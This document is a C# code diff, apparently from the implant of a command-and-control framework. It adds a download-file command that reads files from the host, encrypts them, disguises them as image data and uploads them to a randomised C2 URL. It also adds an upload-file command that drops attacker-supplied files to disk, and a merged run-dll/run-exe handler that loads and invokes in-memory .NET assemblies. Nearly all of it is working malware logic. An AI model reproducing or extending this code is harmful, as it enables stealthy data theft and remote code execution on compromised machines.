@@ -102,28 +102,33 @@ public class Program
 
   }
 
-  static string Encryption(string key, string un, bool comp = false)
+  static string Encryption(string key, string un, bool comp = false, byte[] unByte = null)
   {
-  	var b = System.Text.Encoding.UTF8.GetBytes(un);
-      byte[] byEnc = b;
-      if (comp){
-        byEnc = Compress(b);
-      }
-      try {
-        var a = CAMR(key, null);
-        var e = a.CreateEncryptor();
-        var f = e.TransformFinalBlock(byEnc, 0, byEnc.Length);
-        byte[] p = null;
-        p = Combine(a.IV, f);
-        return System.Convert.ToBase64String(p);
-      } catch {
-        var a = CAMA(key, null);
-        var e = a.CreateEncryptor();
-        var f = e.TransformFinalBlock(byEnc, 0, byEnc.Length);
-        byte[] p = null;
-        p = Combine(a.IV, f);
-        return System.Convert.ToBase64String(p);
-      }
+    byte[] b = null;
+    if (unByte != null) {
+       b = unByte;
+    } else {
+  	   b = System.Text.Encoding.UTF8.GetBytes(un);
+    }
+    byte[] byEnc = b;
+    if (comp){
+      byEnc = Compress(b);
+    }
+    try {
+      var a = CAMR(key, null);
+      var e = a.CreateEncryptor();
+      var f = e.TransformFinalBlock(byEnc, 0, byEnc.Length);
+      byte[] p = null;
+      p = Combine(a.IV, f);
+      return System.Convert.ToBase64String(p);
+    } catch {
+      var a = CAMA(key, null);
+      var e = a.CreateEncryptor();
+      var f = e.TransformFinalBlock(byEnc, 0, byEnc.Length);
+      byte[] p = null;
+      p = Combine(a.IV, f);
+      return System.Convert.ToBase64String(p);
+    }
   }
 
   static System.Security.Cryptography.AesCryptoServiceProvider CAMA(string key,string IV)
@@ -328,13 +333,34 @@ public class Program
       		foreach (string c in split)
       		{
             output = "";
-            //add download-file
             //add upload-file
                       
             if (c.ToLower().StartsWith("loadmodule")){
 	            string module = Regex.Replace(c, "loadmodule", "", RegexOptions.IgnoreCase);
               Assembly assembly = System.Reflection.Assembly.Load(System.Convert.FromBase64String(module));
               output += "Module loaded sucessfully";
+            }
+
+            if (c.ToLower().StartsWith("upload-file")){
+              string path = Regex.Replace(c, "upload-file", "", RegexOptions.IgnoreCase);
+              string[] splitargs = path.Split(new string[] {";"}, StringSplitOptions.RemoveEmptyEntries);
+              Console.WriteLine("Uploaded file to: " + splitargs[1]);
+              byte[] fileBytes = Convert.FromBase64String(splitargs[0]);
+              System.IO.File.WriteAllBytes(splitargs[1].Replace("\"", ""), fileBytes);
+            }
+
+            if (c.ToLower().StartsWith("download-file")){
+              string path = Regex.Replace(c, "download-file ", "", RegexOptions.IgnoreCase);
+              byte[] file = File.ReadAllBytes(path.Replace("\"", ""));
+              byte[] fileChuck = Combine(Encoding.ASCII.GetBytes("0000100001"), file);
+              URL = stringnewURLS[rnd.Next(stringnewURLS.Length)];
+              G = (Guid.NewGuid()).ToString();
+              URL = baseURL+"/"+URL+G+"/?"+RandomURI;
+              string dtask = Encryption(Key, c);
+              string dcoutput = Encryption(Key, "", true, fileChuck);
+              byte[] doutputBytes = System.Convert.FromBase64String(dcoutput);
+              byte[] dsendBytes = GetImgData(doutputBytes, stringnewIMGS);
+              GetWebRequest(dtask).UploadData(URL, dsendBytes);
             }
             
             if (c.ToLower().StartsWith("listmodules")){
@@ -351,10 +377,11 @@ public class Program
               sc = sc.Replace("\"", "");
               scode = sc;
             }
-                    
-            if (c.ToLower().StartsWith("run-exe")){
+
+            if (c.ToLower().StartsWith("run-dll") || c.ToLower().StartsWith("run-exe")){
               string[] splitargs = c.Split(new string[] {" "}, StringSplitOptions.RemoveEmptyEntries);
               int i = 0;
+            	string method = "";
               string splittheseargs = "";
               string qualifiedname = "";
               string name = "";
@@ -365,8 +392,17 @@ public class Program
                 if (i == 2){
                   name = a;
                 }
-                if (i > 2){
-                  splittheseargs = splittheseargs + " " + a;
+                if (c.ToLower().StartsWith("run-exe")) {
+                  if (i > 2){
+                    splittheseargs = splittheseargs + " " + a;
+                  }
+                } else {
+                  if (i == 3){
+                    method = a;
+                  }
+                  if (i > 3){
+                    splittheseargs = splittheseargs + " " + a;
+                  }
                 }
                 i ++;
               }
@@ -376,7 +412,7 @@ public class Program
               foreach (var arg in splitnewargs) {
                 myList.Add(arg);
               }
-
+              
             	var AppDomainAss = AppDomain.CurrentDomain.GetAssemblies();
             	foreach (var Ass in AppDomainAss)
             	{
@@ -384,33 +420,14 @@ public class Program
             		{
             			var loadedType = LoadSomething(qualifiedname + ", " + Ass.FullName);
                   try {
+                    if (c.ToLower().StartsWith("run-exe")) {
                       var xxx = loadedType.Assembly.EntryPoint.Invoke(null, new object[] { myList.ToArray() });
                       output = xxx.ToString();
-                  } catch  {  }
-            		}
-            	}
-            }
-
-            if (c.ToLower().StartsWith("run-dll")){
-              string[] splitargs = c.Split(new string[] {" "}, StringSplitOptions.RemoveEmptyEntries);
-              string qualifiedname = splitargs[1];
-            	string name = splitargs[2];
-            	string method = splitargs[3];
-            	var AppDomainAss = AppDomain.CurrentDomain.GetAssemblies();
-            	foreach (var Ass in AppDomainAss)
-            	{
-            		if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
-            		{
-            			var stringOutput = new StringWriter();
-            			Console.SetOut(stringOutput);
-            			var loadedType = LoadSomething(qualifiedname + ", " + Ass.FullName);
-                  try {
-                      var xxx = loadedType.Assembly.GetType(qualifiedname).InvokeMember(method, BindingFlags.InvokeMethod, null, null, null);
-                      output = xxx.ToString() + stringOutput.ToString();
-                  } catch (Exception e)  {
-                      var xxx = e;
-                      output = xxx.ToString() + stringOutput.ToString();
-                  }
+                    } else {
+                      var xxx = loadedType.Assembly.GetType(qualifiedname).InvokeMember(method, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] { myList.ToArray() });
+                      output = xxx.ToString();
+                    }
+                  } catch { }
             		}
             	}
             }
